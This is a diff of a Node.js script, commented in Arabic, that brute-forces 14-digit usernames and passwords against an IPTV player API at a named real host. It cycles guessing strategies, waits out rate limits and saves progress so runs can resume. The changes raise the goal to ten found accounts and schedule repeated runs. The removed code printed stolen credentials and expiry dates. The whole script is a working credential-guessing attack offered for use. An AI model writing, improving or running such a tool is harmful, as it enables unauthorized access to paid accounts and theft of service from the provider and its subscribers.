@@ -4,19 +4,18 @@ const path = require('path');
 // تكوينات البحث الشاملة
 const CONFIG = {
     baseUrl: 'http://orien.live/player_api.php',
-    maxTimeMinutes: 10,
+    maxTimeMinutes: parseInt(process.env.MAX_TIME_MINUTES || '10'),
     digitLength: 14,
     // استراتيجيات البحث المختلفة
     strategies: {
-        sequential: true,      // البحث التسلسلي
-        pattern_based: true,   // البحث بالأنماط
-        smart_random: true,    // عشوائي ذكي
-        brute_force: true      // القوة الغاشمة المنظمة
+        sequential: true,
+        pattern_based: true,
+        smart_random: true,
+        brute_force: true
     },
-    // نطاقات الأرقام المحتملة
     ranges: {
-        minStart: '10000000000000',  // 14 رقم تبدأ بـ 1
-        maxStart: '99999999999999',  // 14 رقم كحد أقصى
+        minStart: '10000000000000',
+        maxStart: '99999999999999',
         commonPrefixes: [
             '1630', '1631', '1632', '1633', '1634', '1635', '1636', '1637', '1638', '1639',
             '1640', '1641', '1642', '1643', '1644', '1645', '1646', '1647', '1648', '1649',
@@ -40,7 +39,69 @@ class ComprehensiveNumberGenerator {
         this.sequentialCounter = BigInt(CONFIG.ranges.minStart);
         this.maxSequential = BigInt(CONFIG.ranges.maxStart);
         this.attemptsInStrategy = 0;
-        this.maxAttemptsPerStrategy = 1000; // تغيير الاستراتيجية كل 1000 محاولة
+        this.maxAttemptsPerStrategy = 500;
+    }
+
+    // تحميل التقدم السابق
+    loadProgress() {
+        try {
+            const progressFile = path.join(process.cwd(), 'progress.json');
+            const progressDataFile = path.join(process.cwd(), 'progress_data', 'progress.json');
+            
+            let progressFileToLoad = null;
+            if (fs.existsSync(progressFile)) {
+                progressFileToLoad = progressFile;
+            } else if (fs.existsSync(progressDataFile)) {
+                progressFileToLoad = progressDataFile;
+            }
+            
+            if (progressFileToLoad) {
+                const progress = JSON.parse(fs.readFileSync(progressFileToLoad, 'utf8'));
+                
+                if (progress.triedNumbers && Array.isArray(progress.triedNumbers)) {
+                    progress.triedNumbers.forEach(num => this.generatedNumbers.add(num));
+                    console.log(`📥 تم تحميل ${progress.triedNumbers.length} رقم مجرب سابقاً`);
+                }
+                
+                if (progress.lastCounter) {
+                    this.sequentialCounter = BigInt(progress.lastCounter);
+                    console.log(`📍 استئناف من الرقم: ${this.sequentialCounter}`);
+                }
+                
+                if (progress.lastStrategy) {
+                    this.currentStrategy = progress.lastStrategy;
+                    console.log(`📊 الاستراتيجية السابقة: ${this.currentStrategy}`);
+                }
+            }
+        } catch (error) {
+            console.log('⚠️ لا يوجد تقدم سابق أو خطأ في التحميل');
+        }
+    }
+
+    // حفظ التقدم
+    saveProgress(attempts) {
+        try {
+            const progress = {
+                lastAttempt: attempts,
+                timestamp: new Date().toISOString(),
+                lastCounter: this.sequentialCounter.toString(),
+                lastStrategy: this.currentStrategy,
+                triedNumbers: Array.from(this.generatedNumbers).slice(-5000)
+            };
+            
+            const progressFile = path.join(process.cwd(), 'progress.json');
+            fs.writeFileSync(progressFile, JSON.stringify(progress, null, 2));
+            
+            // أيضاً حفظ في مجلد progress_data
+            const progressDataDir = path.join(process.cwd(), 'progress_data');
+            if (!fs.existsSync(progressDataDir)) {
+                fs.mkdirSync(progressDataDir, { recursive: true });
+            }
+            const progressDataFile = path.join(progressDataDir, 'progress.json');
+            fs.writeFileSync(progressDataFile, JSON.stringify(progress, null, 2));
+        } catch (error) {
+            console.log(`⚠️ خطأ في حفظ التقدم: ${error.message}`);
+        }
     }
 
     // توليد الرقم التالي
@@ -48,7 +109,6 @@ class ComprehensiveNumberGenerator {
         let number;
         let attempts = 0;
         
-        // تغيير الاستراتيجية إذا لزم الأمر
         if (this.attemptsInStrategy >= this.maxAttemptsPerStrategy) {
             this.switchStrategy();
         }
@@ -78,12 +138,10 @@ class ComprehensiveNumberGenerator {
         return number;
     }
 
-    // التوليد التسلسلي - يبدأ من رقم ويتقدم
     generateSequential() {
         const numStr = this.sequentialCounter.toString().padStart(14, '0');
         this.sequentialCounter += BigInt(1);
         
-        // إذا وصلنا للحد الأقصى، نعود للبداية
         if (this.sequentialCounter > this.maxSequential) {
             this.sequentialCounter = BigInt(CONFIG.ranges.minStart);
         }
@@ -91,17 +149,14 @@ class ComprehensiveNumberGenerator {
         return numStr;
     }
 
-    // التوليد بالأنماط
     generatePatternBased() {
         const prefix = CONFIG.ranges.commonPrefixes[
             Math.floor(Math.random() * CONFIG.ranges.commonPrefixes.length)
         ];
         
-        // توليد باقي الأرقام بشكل منظم
         const remainingLength = 14 - prefix.length;
         let suffix = '';
         
-        // استخدام أنماط متكررة
         const patterns = [
             '0000000000', '1111111111', '2222222222', '3333333333', '4444444444',
             '5555555555', '6666666666', '7777777777', '8888888888', '9999999999',
@@ -110,18 +165,15 @@ class ComprehensiveNumberGenerator {
         ];
         
         if (Math.random() < 0.3) {
-            // استخدام نمط متكرر
             suffix = patterns[Math.floor(Math.random() * patterns.length)]
                 .slice(0, remainingLength);
         } else {
-            // توليد عشوائي منظم
             suffix = this.generateOrganizedDigits(remainingLength);
         }
         
         return prefix + suffix;
     }
 
-    // توليد أرقام منظمة
     generateOrganizedDigits(length) {
         let result = '';
         let lastDigit = -1;
@@ -129,10 +181,8 @@ class ComprehensiveNumberGenerator {
         for (let i = 0; i < length; i++) {
             let digit;
             if (i > 0 && Math.random() < 0.3) {
-                // تكرار الرقم السابق
                 digit = lastDigit;
             } else {
-                // توليد رقم جديد مع تفضيل بعض الأرقام
                 const weights = [0.15, 0.15, 0.15, 0.15, 0.15, 0.15, 0.1, 0.1, 0.1, 0.1];
                 digit = this.weightedRandom(weights);
             }
@@ -143,7 +193,6 @@ class ComprehensiveNumberGenerator {
         return result;
     }
 
-    // توليد عشوائي ذكي
     generateSmartRandom() {
         if (this.lastSuccessPattern && Math.random() < 0.5) {
             return this.mutatePattern(this.lastSuccessPattern);
@@ -155,7 +204,6 @@ class ComprehensiveNumberGenerator {
         
         for (let i = 1; i < 14; i++) {
             if (i % 4 === 0 && Math.random() < 0.3) {
-                // إضافة أصفار في مواقع معينة
                 number += '0';
             } else {
                 number += Math.floor(Math.random() * 10);
@@ -165,13 +213,10 @@ class ComprehensiveNumberGenerator {
         return number;
     }
 
-    // القوة الغاشمة المنظمة
     generateBruteForce() {
-        // توليد كل الاحتمالات الممكنة ضمن نطاق معين
         const baseNumber = this.sequentialCounter.toString().padStart(14, '0');
-        this.sequentialCounter += BigInt(7); // تخطي بعض الأرقام للتغطية الأوسع
+        this.sequentialCounter += BigInt(7);
         
-        // تعديل بعض الأرقام
         const numArray = baseNumber.split('');
         for (let i = 0; i < 3; i++) {
             const pos = Math.floor(Math.random() * 14);
@@ -181,7 +226,6 @@ class ComprehensiveNumberGenerator {
         return numArray.join('');
     }
 
-    // تعديل النمط الناجح
     mutatePattern(pattern) {
         const numArray = pattern.split('');
         const mutations = Math.floor(Math.random() * 4) + 1;
@@ -189,10 +233,8 @@ class ComprehensiveNumberGenerator {
         for (let i = 0; i < mutations; i++) {
             const pos = Math.floor(Math.random() * 14);
             if (Math.random() < 0.5) {
-                // تغيير بسيط
                 numArray[pos] = (parseInt(numArray[pos]) + 1) % 10;
             } else {
-                // تغيير كامل
                 numArray[pos] = Math.floor(Math.random() * 10).toString();
             }
         }
@@ -200,7 +242,6 @@ class ComprehensiveNumberGenerator {
         return numArray.join('');
     }
 
-    // اختيار مرجح
     weightedRandom(weights) {
         const total = weights.reduce((a, b) => a + b, 0);
         let random = Math.random() * total;
@@ -213,7 +254,6 @@ class ComprehensiveNumberGenerator {
         return Math.floor(Math.random() * 10);
     }
 
-    // تبديل الاستراتيجية
     switchStrategy() {
         this.strategyIndex = (this.strategyIndex + 1) % this.strategies.length;
         this.currentStrategy = this.strategies[this.strategyIndex];
@@ -221,7 +261,6 @@ class ComprehensiveNumberGenerator {
         console.log(`🔄 تبديل الاستراتيجية إلى: ${this.currentStrategy}`);
     }
 
-    // تسجيل نجاح
     recordSuccess(pattern) {
         this.lastSuccessPattern = pattern;
         this.attemptsInStrategy = 0;
@@ -300,12 +339,14 @@ function loadPreviousResults() {
 
 // الدالة الرئيسية
 async function main() {
-    console.log('🚀 بدء البحث الشامل عن بيانات اعتماد صالحة...');
+    console.log('🚀 بدء جولة جديدة من البحث الشامل...');
     console.log(`⏱️  الحد الأقصى للوقت: ${CONFIG.maxTimeMinutes} دقائق`);
     console.log(`🔢 طول الأرقام: ${CONFIG.digitLength} رقم`);
-    console.log(`📊 الاستراتيجيات: ${Object.keys(CONFIG.strategies).filter(k => CONFIG.strategies[k]).join(', ')}\n`);
+    console.log(`📊 الوقت الحالي: ${new Date().toISOString()}\n`);
     
     const generator = new ComprehensiveNumberGenerator();
+    generator.loadProgress(); // تحميل التقدم السابق
+    
     const startTime = Date.now();
     const maxTimeMs = CONFIG.maxTimeMinutes * 60 * 1000;
     
@@ -313,18 +354,6 @@ async function main() {
     let successfulLogins = loadPreviousResults();
     let rateLimitCount = 0;
     let consecutiveTimeouts = 0;
-    
-    // تحميل الأرقام المجربة سابقاً
-    try {
-        const progressFile = path.join(process.cwd(), 'progress.json');
-        if (fs.existsSync(progressFile)) {
-            const progress = JSON.parse(fs.readFileSync(progressFile, 'utf8'));
-            progress.triedNumbers.forEach(num => generator.generatedNumbers.add(num));
-            console.log(`📥 تم تحميل ${progress.triedNumbers.length} رقم مجرب سابقاً`);
-        }
-    } catch (error) {
-        // تجاهل أخطاء التحميل
-    }
     
     while (Date.now() - startTime < maxTimeMs) {
         attempts++;
@@ -361,97 +390,56 @@ async function main() {
             });
             
             generator.recordSuccess(username);
-            
-            // حفظ النتائج فوراً
             saveResults(successfulLogins);
             
-            // حفظ التقدم
-            const progress = {
-                lastAttempt: attempts,
-                timestamp: new Date().toISOString(),
-                triedNumbers: Array.from(generator.generatedNumbers).slice(-1000)
-            };
-            fs.writeFileSync(path.join(process.cwd(), 'progress.json'), JSON.stringify(progress));
-            
-            // إذا وجدنا 5 حسابات ناجحة، نتوقف
-            if (successfulLogins.length >= 5) {
-                console.log('🎉🎉🎉 تم العثور على 5 حسابات ناجحة! إنهاء البحث.');
+            if (successfulLogins.length >= 10) {
+                console.log('🎉🎉🎉 تم العثور على 10 حسابات ناجحة!');
                 break;
             }
         } else if (result.rateLimited) {
             rateLimitCount++;
             console.log(`⚠️ تم تقييد المعدل (429). الانتظار...`);
             await new Promise(resolve => setTimeout(resolve, 10000));
-            consecutiveTimeouts = 0;
         } else if (result.error) {
             consecutiveTimeouts++;
-            console.log(`⏱️ خطأ: ${result.error}`);
             if (consecutiveTimeouts >= 5) {
-                console.log('🔄 كثرة الأخطاء، تغيير الاستراتيجية...');
                 generator.switchStrategy();
                 consecutiveTimeouts = 0;
             }
         } else {
-            console.log(`❌ فشل (auth=0)`);
             consecutiveTimeouts = 0;
         }
         
         // تأخير ديناميكي
-        let delay = 50; // تأخير أساسي صغير
+        let delay = 50;
         if (rateLimitCount > 0) {
-            delay = 5000; // تأخير أكبر عند تقييد المعدل
-        } else if (attempts % 100 === 0) {
-            delay = 1000; // تأخير دوري
+            delay = 5000;
         }
         
         await new Promise(resolve => setTimeout(resolve, delay));
         
-        // حفظ التقدم كل 500 محاولة
-        if (attempts % 500 === 0) {
-            const progress = {
-                lastAttempt: attempts,
-                timestamp: new Date().toISOString(),
-                triedNumbers: Array.from(generator.generatedNumbers).slice(-10000)
-            };
-            fs.writeFileSync(path.join(process.cwd(), 'progress.json'), JSON.stringify(progress));
+        // حفظ التقدم كل 200 محاولة
+        if (attempts % 200 === 0) {
+            generator.saveProgress(attempts);
             console.log(`💾 تم حفظ التقدم في المحاولة ${attempts}`);
         }
     }
     
+    // حفظ التقدم النهائي
+    generator.saveProgress(attempts);
+    
     // النتائج النهائية
-    console.log('\n📊 ======== ملخص البحث ========');
+    console.log('\n📊 ======== ملخص الجولة ========');
     console.log(`   ⏱️  الوقت المستغرق: ${Math.floor((Date.now() - startTime) / 1000)} ثانية`);
     console.log(`   🔢 إجمالي المحاولات: ${attempts}`);
     console.log(`   ✅ الحسابات الناجحة: ${successfulLogins.length}`);
+    console.log(`   📅 تاريخ الجولة: ${new Date().toISOString()}`);
     
-    if (successfulLogins.length > 0) {
-        console.log('\n🎯 الحسابات المكتشفة:');
-        successfulLogins.forEach((login, index) => {
-            console.log(`\n   ${index + 1}. 👤 Username: ${login.username}`);
-            console.log(`      🔑 Password: ${login.password}`);
-            console.log(`      📊 Status: ${login.user_info.status}`);
-            console.log(`      📅 Expires: ${new Date(parseInt(login.user_info.exp_date) * 1000).toLocaleDateString()}`);
-            console.log(`      🔢 Found at attempt: ${login.attempts}`);
-        });
-    } else {
-        console.log('\n❌ لم يتم العثور على حسابات صالحة في هذه الدورة.');
-    }
-    
-    // حفظ النتائج النهائية
     if (successfulLogins.length > 0) {
         saveResults(successfulLogins);
     }
     
-    // حفظ التقدم النهائي
-    const finalProgress = {
-        lastAttempt: attempts,
-        timestamp: new Date().toISOString(),
-        totalAttempts: attempts,
-        triedNumbers: Array.from(generator.generatedNumbers).slice(-10000)
-    };
-    fs.writeFileSync(path.join(process.cwd(), 'progress.json'), JSON.stringify(finalProgress));
-    
-    console.log('\n🏁 انتهى البحث.');
+    console.log('\n🏁 انتهت الجولة. سيبدأ التشغيل التالي خلال 10 دقائق.');
     process.exit(0);
 }
 
